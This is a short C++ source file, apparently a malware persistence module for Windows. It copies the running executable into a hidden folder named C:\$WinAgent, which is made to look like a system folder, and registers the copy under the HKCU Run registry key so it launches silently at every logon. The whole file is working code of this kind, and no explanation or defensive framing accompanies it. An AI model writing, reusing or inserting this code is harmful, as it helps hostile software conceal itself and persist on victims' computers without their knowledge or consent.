#include "persist.h"

void persist()
{
    copyExe();
    regStartupKey();
}

void copyExe()
{
    LPCWSTR newfolder = L"C:\\$WinAgent";
    char filename[MAX_PATH];
    char newLocation[] = "C:\\$WinAgent\\myprogram.exe";
    CreateDirectory(newfolder, NULL);
    SetFileAttributes(newfolder, FILE_ATTRIBUTE_HIDDEN);
    BOOL stats = 0;
    GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFileA(filename, newLocation, stats);
}

void regStartupKey()
{
    std::wstring progPath = L"C:\\$WinAgent\\myprogram.exe";
    HKEY hkey = NULL;
    RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    RegSetValueEx(hkey, L"myprogram", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}
